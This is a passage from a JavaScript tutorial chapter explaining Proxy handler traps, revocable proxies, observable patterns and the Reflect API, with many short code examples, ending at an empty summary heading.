    getOwnPropertyDescriptor(target, property) {
      const desc = Object.getOwnPropertyDescriptor(target, property);
      if (desc) {
        return {
          ...desc,
          writable: false,
          configurable: false
        };
      }
      return desc;
    }
  });
};

const obj = readOnlyView({ name: 'Alice', age: 30 });

const desc = Object.getOwnPropertyDescriptor(obj, 'name');
console.log(desc.writable); // false
console.log(desc.configurable); // false
```

### Handler Traps: `defineProperty`

The `defineProperty` trap intercepts `Object.defineProperty()`.

**Basic `defineProperty`:**

```javascript
const handler = {
  defineProperty(target, property, descriptor) {
    console.log(`Defining property: ${property}`);
    console.log('Descriptor:', descriptor);
    
    // Allow only enumerable properties
    if (descriptor.enumerable === false) {
      throw new Error('All properties must be enumerable');
    }
    
    Object.defineProperty(target, property, descriptor);
    return true;
  }
};

const obj = new Proxy({}, handler);

Object.defineProperty(obj, 'name', {
  value: 'Alice',
  enumerable: true,
  writable: true,
  configurable: true
}); // Works

try {
  Object.defineProperty(obj, 'hidden', {
    value: 'secret',
    enumerable: false
  }); // Error: All properties must be enumerable
} catch (e) {
  console.log(e.message);
}
```

**Enforcing Property Naming Conventions:**

```javascript
const enforceNaming = new Proxy({}, {
  defineProperty(target, property, descriptor) {
    // Enforce camelCase naming
    if (!/^[a-z][a-zA-Z0-9]*$/.test(property)) {
      throw new Error(`Property "${property}" must be in camelCase`);
    }
    
    Object.defineProperty(target, property, descriptor);
    return true;
  }
});

Object.defineProperty(enforceNaming, 'userName', { value: 'Alice' }); // Works

try {
  Object.defineProperty(enforceNaming, 'user_name', { value: 'Bob' });
} catch (e) {
  console.log(e.message); // "Property "user_name" must be in camelCase"
}
```

**Tracking Property Definitions:**

```javascript
const trackDefinitions = (target) => {
  const definitions = [];
  
  return {
    proxy: new Proxy(target, {
      defineProperty(target, property, descriptor) {
        definitions.push({
          property,
          descriptor: { ...descriptor },
          timestamp: new Date()
        });
        
        Object.defineProperty(target, property, descriptor);
        return true;
      }
    }),
    getDefinitions() {
      return definitions;
    }
  };
};

const { proxy, getDefinitions } = trackDefinitions({});

Object.defineProperty(proxy, 'name', { value: 'Alice', writable: true });
Object.defineProperty(proxy, 'age', { value: 30, writable: false });

console.log(getDefinitions());
// [
//   { property: 'name', descriptor: { value: 'Alice', writable: true }, ... },
//   { property: 'age', descriptor: { value: 30, writable: false }, ... }
// ]
```

### Handler Traps: `preventExtensions`, `isExtensible`

These traps control whether new properties can be added to an object.

**`preventExtensions` Trap:**

```javascript
const handler = {
  preventExtensions(target) {
    console.log('Preventing extensions');
    
    // Add some final processing before preventing extensions
    target._sealed = true;
    target._sealedAt = new Date();
    
    Object.preventExtensions(target);
    return true;
  }
};

const obj = new Proxy({ name: 'Alice' }, handler);

Object.preventExtensions(obj); // "Preventing extensions"
console.log(obj._sealed); // true
console.log(obj._sealedAt); // Date object

try {
  obj.newProp = 'value'; // Fails silently in non-strict mode, throws in strict
} catch (e) {
  console.log('Cannot add property');
}
```

**`isExtensible` Trap:**

```javascript
const handler = {
  isExtensible(target) {
    console.log('Checking if extensible');
    return Object.isExtensible(target);
  },
  
  preventExtensions(target) {
    console.log('Making non-extensible');
    Object.preventExtensions(target);
    return true;
  }
};

const obj = new Proxy({ name: 'Alice' }, handler);

console.log(Object.isExtensible(obj)); // true
Object.preventExtensions(obj);
console.log(Object.isExtensible(obj)); // false
```

**Custom Extensibility Logic:**

```javascript
const limitedProperties = (target, maxProps) => {
  return new Proxy(target, {
    set(target, property, value) {
      const currentProps = Object.keys(target).length;
      
      if (!(property in target) && currentProps >= maxProps) {
        throw new Error(`Cannot add more than ${maxProps} properties`);
      }
      
      target[property] = value;
      return true;
    }
  });
};

const obj = limitedProperties({}, 3);

obj.a = 1;
obj.b = 2;
obj.c = 3;

try {
  obj.d = 4; // Error: Cannot add more than 3 properties
} catch (e) {
  console.log(e.message);
}

obj.a = 100; // Updating existing property works
```

### Handler Traps: `getPrototypeOf`, `setPrototypeOf`

These traps intercept prototype operations.

**`getPrototypeOf` Trap:**

```javascript
const proto = { inherited: 'value' };

const handler = {
  getPrototypeOf(target) {
    console.log('Getting prototype');
    return proto;
  }
};

const obj = new Proxy({}, handler);

console.log(Object.getPrototypeOf(obj)); // proto object
console.log(obj.inherited); // 'value' (from proto)
console.log(obj instanceof Object); // true
```

**`setPrototypeOf` Trap:**

```javascript
const handler = {
  setPrototypeOf(target, newProto) {
    console.log('Setting prototype');
    
    // Only allow setting prototype to specific objects
    const allowedProtos = [Object.prototype, null];
    
    if (!allowedProtos.includes(newProto)) {
      throw new Error('Cannot set prototype to arbitrary objects');
    }
    
    Object.setPrototypeOf(target, newProto);
    return true;
  }
};

const obj = new Proxy({}, handler);

Object.setPrototypeOf(obj, null); // Works
// Object.setPrototypeOf(obj, { custom: true }); // Error
```

**Immutable Prototype:**

```javascript
const fixedPrototype = (target) => {
  const originalProto = Object.getPrototypeOf(target);
  
  return new Proxy(target, {
    setPrototypeOf(target, newProto) {
      if (newProto !== originalProto) {
        throw new Error('Cannot change prototype');
      }
      return true;
    }
  });
};

const obj = fixedPrototype({ name: 'Alice' });

try {
  Object.setPrototypeOf(obj, null); // Error: Cannot change prototype
} catch (e) {
  console.log(e.message);
}
```

### Handler Traps: `apply`, `construct`

These traps are for function proxies.

**`apply` Trap:**

```javascript
function greet(name) {
  return `Hello, ${name}!`;
}

const handler = {
  apply(target, thisArg, argumentsList) {
    console.log(`Function called with args: ${argumentsList}`);
    
    // Modify arguments
    const upperCaseArgs = argumentsList.map(arg => 
      typeof arg === 'string' ? arg.toUpperCase() : arg
    );
    
    return target.apply(thisArg, upperCaseArgs);
  }
};

const proxyGreet = new Proxy(greet, handler);

console.log(proxyGreet('alice')); 
// "Function called with args: alice"
// "Hello, ALICE!"
```

**Function Call Validation:**

```javascript
const validateArgs = (fn, validators) => {
  return new Proxy(fn, {
    apply(target, thisArg, argumentsList) {
      if (argumentsList.length !== validators.length) {
        throw new Error(
          `Expected ${validators.length} arguments, got ${argumentsList.length}`
        );
      }
      
      for (let i = 0; i < validators.length; i++) {
        if (!validators[i](argumentsList[i])) {
          throw new TypeError(`Argument ${i} failed validation`);
        }
      }
      
      return target.apply(thisArg, argumentsList);
    }
  });
};

const add = validateArgs(
  (a, b) => a + b,
  [
    (val) => typeof val === 'number',
    (val) => typeof val === 'number'
  ]
);

console.log(add(5, 3)); // 8

try {
  add('5', 3); // TypeError: Argument 0 failed validation
} catch (e) {
  console.log(e.message);
}
```

**Memoization with `apply`:**

```javascript
const memoize = (fn) => {
  const cache = new Map();
  
  return new Proxy(fn, {
    apply(target, thisArg, args) {
      const key = JSON.stringify(args);
      
      if (cache.has(key)) {
        console.log('Returning cached result');
        return cache.get(key);
      }
      
      console.log('Computing result');
      const result = target.apply(thisArg, args);
      cache.set(key, result);
      return result;
    }
  });
};

const expensiveOperation = memoize((n) => {
  let sum = 0;
  for (let i = 0; i < n; i++) {
    sum += i;
  }
  return sum;
});

console.log(expensiveOperation(1000000)); // "Computing result" then result
console.log(expensiveOperation(1000000)); // "Returning cached result" then result
```

**`construct` Trap:**

```javascript
function Person(name, age) {
  this.name = name;
  this.age = age;
}

const handler = {
  construct(target, args, newTarget) {
    console.log(`Creating new instance with args: ${args}`);
    
    // Add timestamp to all instances
    const instance = new target(...args);
    instance.createdAt = new Date();
    
    return instance;
  }
};

const ProxyPerson = new Proxy(Person, handler);

const alice = new ProxyPerson('Alice', 30);
console.log(alice.name); // 'Alice'
console.log(alice.createdAt); // Date object
```

**Constructor Validation:**

```javascript
const validateConstructor = (Constructor, validators) => {
  return new Proxy(Constructor, {
    construct(target, args) {
      // Validate arguments
      for (let i = 0; i < validators.length; i++) {
        if (args[i] !== undefined && !validators[i](args[i])) {
          throw new TypeError(`Constructor argument ${i} failed validation`);
        }
      }
      
      return new target(...args);
    }
  });
};

function User(name, age, email) {
  this.name = name;
  this.age = age;
  this.email = email;
}

const ValidatedUser = validateConstructor(User, [
  (name) => typeof name === 'string' && name.length > 0,
  (age) => typeof age === 'number' && age >= 0 && age <= 150,
  (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
]);

const user = new ValidatedUser('Alice', 30, 'alice@example.com'); // Works

try {
  new ValidatedUser('Bob', -5, 'bob@example.com'); // Error
} catch (e) {
  console.log(e.message); // "Constructor argument 1 failed validation"
}
```

**Singleton Pattern with `construct`:**

```javascript
const singleton = (Constructor) => {
  let instance = null;
  
  return new Proxy(Constructor, {
    construct(target, args) {
      if (!instance) {
        instance = new target(...args);
      }
      return instance;
    }
  });
};

function Database(connection) {
  this.connection = connection;
}

const DatabaseSingleton = singleton(Database);

const db1 = new DatabaseSingleton('mysql://localhost');
const db2 = new DatabaseSingleton('postgres://localhost');

console.log(db1 === db2); // true (same instance)
console.log(db1.connection); // 'mysql://localhost'
console.log(db2.connection); // 'mysql://localhost' (same instance)
```

### Revocable Proxies

Revocable proxies can be disabled after creation, making the proxy unusable.

**Basic Revocable Proxy:**

```javascript
const target = { name: 'Alice', age: 30 };

const { proxy, revoke } = Proxy.revocable(target, {
  get(target, property) {
    console.log(`Getting: ${property}`);
    return target[property];
  }
});

console.log(proxy.name); // "Getting: name" then "Alice"
console.log(proxy.age); // "Getting: age" then 30

// Revoke the proxy
revoke();

try {
  console.log(proxy.name); // TypeError: Cannot perform 'get' on a proxy that has been revoked
} catch (e) {
  console.log(e.message);
}
```

**Temporary Access:**

```javascript
const createTemporaryAccess = (target, duration) => {
  const { proxy, revoke } = Proxy.revocable(target, {
    get(target, property) {
      return target[property];
    },
    set(target, property, value) {
      target[property] = value;
      return true;
    }
  });
  
  // Auto-revoke after duration
  setTimeout(() => {
    console.log('Access revoked');
    revoke();
  }, duration);
  
  return proxy;
};

const secret = { password: 'secret123', token: 'abc' };
const tempAccess = createTemporaryAccess(secret, 2000); // 2 seconds

console.log(tempAccess.password); // Works
tempAccess.newProp = 'value'; // Works

// After 2 seconds, proxy is revoked
setTimeout(() => {
  try {
    console.log(tempAccess.password); // Error
  } catch (e) {
    console.log('Cannot access - proxy revoked');
  }
}, 3000);
```

**Resource Cleanup:**

```javascript
const createManagedResource = (resource) => {
  let isActive = true;
  
  const { proxy, revoke } = Proxy.revocable(resource, {
    get(target, property) {
      if (!isActive) {
        throw new Error('Resource has been released');
      }
      return target[property];
    },
    
    set(target, property, value) {
      if (!isActive) {
        throw new Error('Resource has been released');
      }
      target[property] = value;
      return true;
    }
  });
  
  return {
    resource: proxy,
    release() {
      if (isActive) {
        console.log('Releasing resource...');
        // Cleanup code here
        resource.cleanup?.();
        isActive = false;
        revoke();
      }
    }
  };
};

const { resource, release } = createManagedResource({
  data: 'important',
  cleanup() {
    console.log('Cleanup performed');
  }
});

console.log(resource.data); // 'important'
release(); // Cleanup and revoke
// console.log(resource.data); // Error
```

### Use Cases (Validation, Logging, Virtualization)

**Validation:**

```javascript
const createValidator = (schema) => {
  return new Proxy({}, {
    set(target, property, value) {
      const validator = schema[property];
      
      if (!validator) {
        throw new Error(`Unknown property: ${property}`);
      }
      
      if (!validator.type || typeof value !== validator.type) {
        throw new TypeError(
          `${property} must be of type ${validator.type}`
        );
      }
      
      if (validator.required && (value === null || value === undefined)) {
        throw new Error(`${property} is required`);
      }
      
      if (validator.min !== undefined && value < validator.min) {
        throw new RangeError(
          `${property} must be at least ${validator.min}`
        );
      }
      
      if (validator.max !== undefined && value > validator.max) {
        throw new RangeError(
          `${property} must be at most ${validator.max}`
        );
      }
      
      if (validator.pattern && !validator.pattern.test(value)) {
        throw new Error(`${property} format is invalid`);
      }
      
      target[property] = value;
      return true;
    }
  });
};

const userSchema = {
  name: { type: 'string', required: true },
  age: { type: 'number', min: 0, max: 150 },
  email: { type: 'string', pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/ }
};

const user = createValidator(userSchema);

user.name = 'Alice'; // Works
user.age = 30; // Works
user.email = 'alice@example.com'; // Works

try {
  user.age = 200; // RangeError: age must be at most 150
} catch (e) {
  console.log(e.message);
}

try {
  user.email = 'invalid'; // Error: email format is invalid
} catch (e) {
  console.log(e.message);
}
```

**Logging:**

```javascript
const createLogger = (target, name = 'Object') => {
  return new Proxy(target, {
    get(target, property) {
      console.log(`[${name}] GET ${String(property)}: ${target[property]}`);
      return target[property];
    },
    
    set(target, property, value) {
      console.log(
        `[${name}] SET ${String(property)}: ${target[property]} -> ${value}`
      );
      target[property] = value;
      return true;
    },
    
    deleteProperty(target, property) {
      console.log(`[${name}] DELETE ${String(property)}: ${target[property]}`);
      delete target[property];
      return true;
    },
    
    apply(target, thisArg, args) {
      console.log(`[${name}] CALL with args: ${JSON.stringify(args)}`);
      const result = target.apply(thisArg, args);
      console.log(`[${name}] RETURN: ${result}`);
      return result;
    }
  });
};

const obj = createLogger({ name: 'Alice', age: 30 }, 'User');

obj.name; // "[User] GET name: Alice"
obj.age = 31; // "[User] SET age: 30 -> 31"
delete obj.age; // "[User] DELETE age: 31"

const add = createLogger((a, b) => a + b, 'AddFunction');
add(5, 3); // Logs call and return
```

**Virtualization (Lazy Loading):**

```javascript
const createVirtualArray = (length, generator) => {
  const cache = {};
  
  return new Proxy({}, {
    get(target, property) {
      if (property === 'length') {
        return length;
      }
      
      const index = Number(property);
      if (Number.isInteger(index) && index >= 0 && index < length) {
        if (!(index in cache)) {
          console.log(`Generating value for index ${index}`);
          cache[index] = generator(index);
        }
        return cache[index];
      }
      
      return target[property];
    }
  });
};

// Virtual array of squares
const squares = createVirtualArray(1000000, (i) => i * i);

console.log(squares[0]); // 0
console.log(squares[10]); // 100
console.log(squares[100]); // 10000
console.log(squares.length); // 1000000

// Only 3 values were actually computed!
```

**API Wrapper:**

```javascript
const createAPIWrapper = (baseURL) => {
  return new Proxy({}, {
    get(target, property) {
      return async (...args) => {
        const endpoint = `${baseURL}/${property}`;
        console.log(`Calling API: ${endpoint}`);
        
        // Simulate API call
        return {
          endpoint,
          method: property,
          args
        };
      };
    }
  });
};

const api = createAPIWrapper('https://api.example.com');

// API calls are created dynamically
api.getUsers().then(result => console.log(result));
api.createPost('title', 'content').then(result => console.log(result));
api.updateUser(123, { name: 'Alice' }).then(result => console.log(result));
```

### Observable Pattern with Proxy

**Basic Observable:**

```javascript
const createObservable = (target, onChange) => {
  return new Proxy(target, {
    set(target, property, value) {
      const oldValue = target[property];
      target[property] = value;
      
      onChange({
        property,
        oldValue,
        newValue: value,
        target
      });
      
      return true;
    },
    
    deleteProperty(target, property) {
      const oldValue = target[property];
      delete target[property];
      
      onChange({
        property,
        oldValue,
        newValue: undefined,
        deleted: true,
        target
      });
      
      return true;
    }
  });
};

const state = createObservable(
  { count: 0, name: 'Alice' },
  (change) => {
    console.log(`Property "${change.property}" changed from`, 
                change.oldValue, 'to', change.newValue);
  }
);

state.count = 1; // Logs change
state.name = 'Bob'; // Logs change
delete state.count; // Logs deletion
```

**Observable with Multiple Listeners:**

```javascript
const createObservableWithListeners = (target) => {
  const listeners = [];
  
  const proxy = new Proxy(target, {
    set(target, property, value) {
      const oldValue = target[property];
      target[property] = value;
      
      const change = { property, oldValue, newValue: value };
      listeners.forEach(listener => listener(change));
      
      return true;
    }
  });
  
  return {
    observable: proxy,
    subscribe(listener) {
      listeners.push(listener);
      
      // Return unsubscribe function
      return () => {
        const index = listeners.indexOf(listener);
        if (index > -1) {
          listeners.splice(index, 1);
        }
      };
    }
  };
};

const { observable, subscribe } = createObservableWithListeners({
  count: 0
});

const unsubscribe1 = subscribe((change) => {
  console.log('Listener 1:', change);
});

const unsubscribe2 = subscribe((change) => {
  console.log('Listener 2:', change);
});

observable.count = 1; // Both listeners notified
observable.count = 2; // Both listeners notified

unsubscribe1(); // Remove first listener

observable.count = 3; // Only listener 2 notified
```

**Deep Observable:**

```javascript
const createDeepObservable = (target, onChange, path = []) => {
  return new Proxy(target, {
    get(target, property) {
      const value = target[property];
      
      // If value is an object, wrap it in a proxy too
      if (typeof value === 'object' && value !== null) {
        return createDeepObservable(value, onChange, [...path, property]);
      }
      
      return value;
    },
    
    set(target, property, value) {
      const oldValue = target[property];
      target[property] = value;
      
      onChange({
        path: [...path, property],
        property,
        oldValue,
        newValue: value
      });
      
      return true;
    }
  });
};

const state = createDeepObservable(
  {
    user: {
      name: 'Alice',
      address: {
        city: 'New York',
        zip: '10001'
      }
    }
  },
  (change) => {
    console.log(`Changed ${change.path.join('.')}: ${change.oldValue} -> ${change.newValue}`);
  }
);

state.user.name = 'Bob'; // "Changed user.name: Alice -> Bob"
state.user.address.city = 'Boston'; // "Changed user.address.city: New York -> Boston"
```

**Reactive UI with Observable:**

```javascript
const createReactiveState = (initialState) => {
  const listeners = new Map();
  
  const notify = (property, value) => {
    if (listeners.has(property)) {
      listeners.get(property).forEach(callback => callback(value));
    }
    
    // Notify wildcard listeners
    if (listeners.has('*')) {
      listeners.get('*').forEach(callback => 
        callback({ property, value })
      );
    }
  };
  
  const proxy = new Proxy(initialState, {
    set(target, property, value) {
      target[property] = value;
      notify(property, value);
      return true;
    }
  });
  
  return {
    state: proxy,
    
    watch(property, callback) {
      if (!listeners.has(property)) {
        listeners.set(property, []);
      }
      listeners.get(property).push(callback);
      
      // Return unwatch function
      return () => {
        const callbacks = listeners.get(property);
        const index = callbacks.indexOf(callback);
        if (index > -1) {
          callbacks.splice(index, 1);
        }
      };
    }
  };
};

const { state, watch } = createReactiveState({
  count: 0,
  name: 'Alice'
});

// Watch specific property
watch('count', (value) => {
  console.log(`Count updated to: ${value}`);
  // Update DOM: document.getElementById('count').textContent = value;
});

// Watch all changes
watch('*', (change) => {
  console.log(`State changed:`, change);
});

state.count = 1; // Triggers count watcher and wildcard watcher
state.count = 2;
state.name = 'Bob'; // Triggers only wildcard watcher
```

---

## 15.2 Reflect

The Reflect API provides methods for interceptable JavaScript operations. These methods correspond to Proxy handler traps and provide a more functional approach to object manipulation.

### `Reflect` Methods (Mirror Proxy Traps)

Every Proxy trap has a corresponding Reflect method.

**`Reflect.get()`:**

```javascript
const obj = {
  name: 'Alice',
  age: 30,
  get fullInfo() {
    return `${this.name}, ${this.age}`;
  }
};

// Traditional access
console.log(obj.name); // 'Alice'

// Using Reflect
console.log(Reflect.get(obj, 'name')); // 'Alice'
console.log(Reflect.get(obj, 'age')); // 30

// With receiver (sets 'this' for getters)
const anotherObj = { name: 'Bob', age: 25 };
console.log(Reflect.get(obj, 'fullInfo', anotherObj)); // "Bob, 25"
```

**`Reflect.set()`:**

```javascript
const obj = { name: 'Alice' };

// Traditional assignment
obj.name = 'Bob';

// Using Reflect
Reflect.set(obj, 'age', 30);
console.log(obj); // { name: 'Bob', age: 30 }

// Returns boolean indicating success
const success = Reflect.set(obj, 'email', 'alice@example.com');
console.log(success); // true

// With receiver (for setters)
const target = {
  _value: 0,
  set value(v) {
    this._value = v;
  }
};

const receiver = {};
Reflect.set(target, 'value', 42, receiver);
console.log(receiver._value); // 42 (set on receiver, not target)
```

**`Reflect.has()`:**

```javascript
const obj = { name: 'Alice', age: 30 };

// Traditional 'in' operator
console.log('name' in obj); // true

// Using Reflect
console.log(Reflect.has(obj, 'name')); // true
console.log(Reflect.has(obj, 'email')); // false

// Works with prototype chain
console.log(Reflect.has(obj, 'toString')); // true
```

**`Reflect.deleteProperty()`:**

```javascript
const obj = { name: 'Alice', age: 30 };

// Traditional delete
delete obj.name;

// Using Reflect
const success = Reflect.deleteProperty(obj, 'age');
console.log(success); // true
console.log(obj); // {}

// Returns false if property is non-configurable
Object.defineProperty(obj, 'id', {
  value: 123,
  configurable: false
});

const deleted = Reflect.deleteProperty(obj, 'id');
console.log(deleted); // false (couldn't delete)
console.log(obj.id); // 123 (still there)
```

**`Reflect.ownKeys()`:**

```javascript
const obj = {
  name: 'Alice',
  age: 30,
  [Symbol('id')]: 123
};

// Get all own property keys (including symbols)
const keys = Reflect.ownKeys(obj);
console.log(keys); // ['name', 'age', Symbol(id)]

// Compare with Object.keys (doesn't include symbols)
console.log(Object.keys(obj)); // ['name', 'age']

// Compare with Object.getOwnPropertySymbols
console.log(Object.getOwnPropertySymbols(obj)); // [Symbol(id)]
```

**`Reflect.getOwnPropertyDescriptor()`:**

```javascript
const obj = { name: 'Alice' };

Object.defineProperty(obj, 'age', {
  value: 30,
  writable: false,
  enumerable: false
});

// Get descriptor
const desc = Reflect.getOwnPropertyDescriptor(obj, 'age');
console.log(desc);
// { value: 30, writable: false, enumerable: false, configurable: false }

// Returns undefined if property doesn't exist
console.log(Reflect.getOwnPropertyDescriptor(obj, 'missing')); // undefined
```

**`Reflect.defineProperty()`:**

```javascript
const obj = {};

// Define property with descriptor
const success = Reflect.defineProperty(obj, 'name', {
  value: 'Alice',
  writable: true,
  enumerable: true,
  configurable: true
});

console.log(success); // true
console.log(obj.name); // 'Alice'

// Returns false on failure (doesn't throw)
Object.preventExtensions(obj);
const added = Reflect.defineProperty(obj, 'age', { value: 30 });
console.log(added); // false
```

**`Reflect.preventExtensions()` and `Reflect.isExtensible()`:**

```javascript
const obj = { name: 'Alice' };

// Check if extensible
console.log(Reflect.isExtensible(obj)); // true

// Prevent extensions
const prevented = Reflect.preventExtensions(obj);
console.log(prevented); // true

// Check again
console.log(Reflect.isExtensible(obj)); // false

// Cannot add new properties
try {
  obj.age = 30; // Fails silently or throws in strict mode
} catch (e) {
  console.log('Cannot add property');
}
```

**`Reflect.getPrototypeOf()` and `Reflect.setPrototypeOf()`:**

```javascript
const proto = { inherited: 'value' };
const obj = Object.create(proto);

// Get prototype
console.log(Reflect.getPrototypeOf(obj) === proto); // true

// Set prototype
const newProto = { newInherited: 'newValue' };
const success = Reflect.setPrototypeOf(obj, newProto);
console.log(success); // true
console.log(obj.newInherited); // 'newValue'
```

**`Reflect.apply()`:**

```javascript
function greet(greeting, punctuation) {
  return `${greeting}, ${this.name}${punctuation}`;
}

const person = { name: 'Alice' };

// Traditional call/apply
console.log(greet.call(person, 'Hello', '!')); // "Hello, Alice!"
console.log(greet.apply(person, ['Hello', '!'])); // "Hello, Alice!"

// Using Reflect.apply
console.log(Reflect.apply(greet, person, ['Hello', '!'])); // "Hello, Alice!"

// Works with any callable
console.log(Reflect.apply(Math.max, null, [1, 5, 3, 9, 2])); // 9
```

**`Reflect.construct()`:**

```javascript
function Person(name, age) {
  this.name = name;
  this.age = age;
}

// Traditional construction
const alice = new Person('Alice', 30);

// Using Reflect.construct
const bob = Reflect.construct(Person, ['Bob', 25]);
console.log(bob instanceof Person); // true
console.log(bob.name); // 'Bob'

// With custom prototype (third argument)
function Employee() {}
const charlie = Reflect.construct(Person, ['Charlie', 35], Employee);
console.log(charlie instanceof Employee); // true
console.log(charlie.name); // 'Charlie'
```

### Why Use Reflect Over Object Methods

Reflect provides several advantages over traditional Object methods and operators.

**1. Consistent Return Values:**

```javascript
// Object.defineProperty throws on failure
try {
  const obj = {};
  Object.preventExtensions(obj);
  Object.defineProperty(obj, 'name', { value: 'Alice' }); // Throws
} catch (e) {
  console.log('Object.defineProperty threw an error');
}

// Reflect.defineProperty returns boolean
const obj2 = {};
Object.preventExtensions(obj2);
const success = Reflect.defineProperty(obj2, 'name', { value: 'Alice' });
console.log(success); // false (no exception)
```

**2. Function Application:**

```javascript
// Traditional: function.apply(thisArg, args)
// Can be confusing when function is not a direct reference
function greet() {
  return `Hello, ${this.name}`;
}

const methods = { greet };
const obj = { name: 'Alice' };

// Awkward
console.log(methods.greet.apply(obj)); // "Hello, Alice"

// Clearer with Reflect
console.log(Reflect.apply(methods.greet, obj, [])); // "Hello, Alice"
```

**3. Reliable Operators as Functions:**

```javascript
// The 'in' operator can be shadowed
const obj = {
  name: 'Alice',
  in: 'shadowed' // Shadows 'in' operator in some contexts
};

// Using Reflect avoids confusion
console.log(Reflect.has(obj, 'name')); // true
console.log(Reflect.has(obj, 'in')); // true

// Same with delete
const obj2 = {
  value: 42,
  delete: 'shadowed'
};

Reflect.deleteProperty(obj2, 'value'); // Clear and unambiguous
```

**4. Better Error Handling:**

```javascript
// Trying to prevent extensions on non-object
try {
  Object.preventExtensions(42); // Returns 42 in ES6+ (confusing)
} catch (e) {
  console.log('Error');
}

// Reflect throws TypeError for non-objects (more predictable)
try {
  Reflect.preventExtensions(42); // TypeError
} catch (e) {
  console.log('Reflect properly throws for non-objects');
}
```

**5. Functional Programming Style:**

```javascript
// Object methods are imperative
const obj = { name: 'Alice' };
obj.age = 30;
delete obj.name;

// Reflect methods are more functional
const obj2 = { name: 'Alice' };
const operations = [
  () => Reflect.set(obj2, 'age', 30),
  () => Reflect.deleteProperty(obj2, 'name')
];

operations.forEach(op => {
  const success = op();
  console.log('Operation success:', success);
});
```

**6. Metaprogramming Clarity:**

```javascript
// When building abstractions, Reflect is clearer
function createFlexibleObject(target, config) {
  const handler = {
    get(target, property) {
      if (config.log) {
        console.log(`Getting ${property}`);
      }
      // Using Reflect makes it clear we're delegating to default behavior
      return Reflect.get(target, property);
    },
    
    set(target, property, value) {
      if (config.validate) {
        // Validation logic
      }
      // Explicit delegation
      return Reflect.set(target, property, value);
    }
  };
  
  return new Proxy(target, handler);
}
```

### Reflect as Receiver in Proxy

Using Reflect in Proxy handlers provides correct default behavior and proper receiver handling.

**Basic Pattern:**

```javascript
const handler = {
  get(target, property, receiver) {
    console.log(`Getting ${property}`);
    // Delegate to default behavior with correct receiver
    return Reflect.get(target, property, receiver);
  },
  
  set(target, property, value, receiver) {
    console.log(`Setting ${property} = ${value}`);
    // Delegate to default behavior with correct receiver
    return Reflect.set(target, property, value, receiver);
  }
};

const obj = new Proxy({ name: 'Alice' }, handler);
console.log(obj.name); // Logs and returns 'Alice'
obj.age = 30; // Logs and sets
```

**Why Receiver Matters:**

```javascript
const target = {
  _value: 0,
  get value() {
    return this._value;
  },
  set value(v) {
    this._value = v;
  }
};

const handler = {
  get(target, property, receiver) {
    console.log('Proxy get:', property);
    // CORRECT: Pass receiver so 'this' in getter is the proxy
    return Reflect.get(target, property, receiver);
  },
  
  set(target, property, value, receiver) {
    console.log('Proxy set:', property, value);
    // CORRECT: Pass receiver so 'this' in setter is the proxy
    return Reflect.set(target, property, value, receiver);
  }
};

const proxy = new Proxy(target, handler);

// Without receiver, getters/setters would use wrong 'this'
proxy.value = 42; // Correctly sets proxy._value
console.log(proxy.value); // Correctly gets from proxy._value
console.log(proxy._value); // 42
```

**Inheritance Example:**

```javascript
const parent = {
  _value: 0,
  get value() {
    console.log('Parent getter, this:', this);
    return this._value;
  }
};

const handler = {
  get(target, property, receiver) {
    console.log(`Intercepted: ${property}`);
    // Passing receiver ensures 'this' in getter is the child
    return Reflect.get(target, property, receiver);
  }
};

const child = Object.create(new Proxy(parent, handler));
child._value = 42;

// When accessing through child, 'this' should be child
console.log(child.value);
// Without receiver, 'this' would be parent
// With receiver, 'this' is correctly child, returns 42
```

**Complete Example with All Traps:**

```javascript
const createLoggingProxy = (target, name = 'Proxy') => {
  return new Proxy(target, {
    get(target, property, receiver) {
      console.log(`[${name}] GET ${String(property)}`);
      return Reflect.get(target, property, receiver);
    },
    
    set(target, property, value, receiver) {
      console.log(`[${name}] SET ${String(property)} = ${value}`);
      return Reflect.set(target, property, value, receiver);
    },
    
    has(target, property) {
      console.log(`[${name}] HAS ${String(property)}`);
      return Reflect.has(target, property);
    },
    
    deleteProperty(target, property) {
      console.log(`[${name}] DELETE ${String(property)}`);
      return Reflect.deleteProperty(target, property);
    },
    
    ownKeys(target) {
      console.log(`[${name}] OWN_KEYS`);
      return Reflect.ownKeys(target);
    },
    
    getOwnPropertyDescriptor(target, property) {
      console.log(`[${name}] GET_DESCRIPTOR ${String(property)}`);
      return Reflect.getOwnPropertyDescriptor(target, property);
    },
    
    defineProperty(target, property, descriptor) {
      console.log(`[${name}] DEFINE ${String(property)}`);
      return Reflect.defineProperty(target, property, descriptor);
    },
    
    preventExtensions(target) {
      console.log(`[${name}] PREVENT_EXTENSIONS`);
      return Reflect.preventExtensions(target);
    },
    
    isExtensible(target) {
      console.log(`[${name}] IS_EXTENSIBLE`);
      return Reflect.isExtensible(target);
    },
    
    getPrototypeOf(target) {
      console.log(`[${name}] GET_PROTOTYPE`);
      return Reflect.getPrototypeOf(target);
    },
    
    setPrototypeOf(target, proto) {
      console.log(`[${name}] SET_PROTOTYPE`);
      return Reflect.setPrototypeOf(target, proto);
    },
    
    apply(target, thisArg, argumentsList) {
      console.log(`[${name}] APPLY`);
      return Reflect.apply(target, thisArg, argumentsList);
    },
    
    construct(target, argumentsList, newTarget) {
      console.log(`[${name}] CONSTRUCT`);
      return Reflect.construct(target, argumentsList, newTarget);
    }
  });
};

// Test with object
const obj = createLoggingProxy({ name: 'Alice' }, 'Object');
obj.name; // Logs GET
obj.age = 30; // Logs SET
'name' in obj; // Logs HAS
Object.keys(obj); // Logs OWN_KEYS

// Test with function
const fn = createLoggingProxy((a, b) => a + b, 'Function');
fn(5, 3); // Logs APPLY

// Test with constructor
const Ctor = createLoggingProxy(function(name) { this.name = name; }, 'Constructor');
new Ctor('Bob'); // Logs CONSTRUCT
```

**Maintaining Invariants:**

```javascript
// Proxies must respect object invariants
const handler = {
  get(target, property, receiver) {
    // If target property is non-writable, non-configurable
    // we MUST return the same value
    const desc = Object.getOwnPropertyDescriptor(target, property);
    
    if (desc && !desc.writable && !desc.configurable) {
      // Must return actual value, not a modified one
      return Reflect.get(target, property, receiver);
    }
    
    // Can modify other properties
    return Reflect.get(target, property, receiver);
  }
};

const obj = {};
Object.defineProperty(obj, 'constant', {
  value: 42,
  writable: false,
  configurable: false
});

const proxy = new Proxy(obj, handler);
console.log(proxy.constant); // Must be 42
```

---

## Summary

This document covered Proxy and Reflection comprehensively:

